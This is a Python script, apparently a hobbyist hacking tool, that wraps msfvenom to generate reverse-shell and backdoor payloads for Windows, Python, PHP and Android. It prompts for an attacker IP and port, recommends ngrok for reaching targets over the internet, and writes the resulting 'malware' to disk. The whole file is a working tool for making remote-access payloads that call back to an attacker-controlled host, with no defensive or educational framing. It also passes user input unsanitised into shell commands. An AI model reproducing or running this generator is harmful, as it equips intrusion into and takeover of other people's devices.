#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess as sp 
import os, sys
from colorama import *
import time
import colorama

if not os.getuid() == 0:
    sys.exit(Fore.GREEN + Back.BLACK + 'This script must be run as root.')           


sp.call("clear", shell=True)
sp.call("chmod +x logo.py", shell=True)
sp.call("python logo.py", shell=True)
colorama.init(autoreset = True)
try:
    print(Fore.RED + "METASPLOIT FRAMEWORK MUST BE INSTALLED IN ORDER TO WORK.")
    print("\n")
    def rev_shell():
        print("enter the type of the malware you want to generate: \n")
        print(Fore.GREEN + """
        [+] Windows Reverse Shell.
        [+] Python Reverse Shell.
        [+] PHP Reverse Shell.
        [+] Android Backdoor.
        \n
        """)
        print("Your choice:")
        u = input()
        print("\n")
        print(Fore.BLACK + Back.WHITE + "Enter the CONNECTION TYPE for the payload(For Ex: reverse_tcp or reverse_https etc): \n")
        print(""" 
              [1] reverse_tcp
              [2] reverse_http \n""")
        connection=input()
        if connection =='1' or connection == 'reverse_tcp':
            connection = 'reverse_tcp'
        elif connection =='2' or connection == 'reverse_http':
            connection = 'reverse_http'
        else:
            print(Fore.RED + "Invalid Input. \n")       
        
        print("\n")
        print(Fore.BLACK + Back.WHITE + "Enter the ip address: \n")
        print(Fore.RED + """ If you are using ngrok, then use the Ngrok tunnel 
              Ip and Port here if your intension to use this script over Wide 
              Area Network[WAN]""")
        your_ip=input()
        print("\n")
        print(Fore.BLACK + Back.WHITE + "Enter the port:")
        print("\n")
        port=input()
        print("\n")
        print(Fore.BLACK + Back.WHITE + "enter the path of your directory: [For Ex: /home/darknet/Desktop/MyMalwares/]")
        print("\n")
        your_directory=input()
        print("\n")
        print(Fore.BLACK + Back.WHITE + "Enter your file name with proper extension such as"+" "+ Fore.RED + "file.exe file.py file.php etc:")
        your_file_name=input()
        print("\n")
        if u == 'windows':
            sp.call("msfvenom -p windows/meterpreter/"+connection + " " + "lhost="+your_ip+" "+"lport="+port+" " +"-o"+" "+your_directory+your_file_name ,shell=True)
            print("\n")
        elif u == 'python':
            sp.call("msfvenom -p python/meterpreter/"+connection + " " + "lhost="+your_ip+" "+"lport="+port+" " +"-o"+" "+your_directory+your_file_name ,shell=True)
            print("\n")
        elif u == 'php':
            sp.call("msfvenom -p php/meterpreter/"+connection + " " + "lhost="+your_ip+" "+"lport="+port+" " +"-o"+" "+your_directory+your_file_name ,shell=True)
            print("\n")
        elif u == 'android':
            sp.call("msfvenom -p android/meterpreter/"+connection + " " + "lhost="+your_ip+" "+"lport="+port+" " +"-o"+" "+your_directory+your_file_name ,shell=True)
            print("\n")
            
        else: 
            print("invalid input")



    rev_shell()

    while True:
        run_again = input("Do you want to run the script again? Answer with yes/no. \n")
        if run_again == 'yes' or run_again == 'y':
            sp.call("clear", shell=True)
            sp.call("python logo.py", shell=True)
            rev_shell()
        else:
            print("Thanks for using. Bye")
            break
except KeyboardInterrupt:
    print("\n")
    print("Terminated by user.. Quitting. \n")
    time.sleep(0.5)
    print("Thanks for Using. \U0001f600 \n")

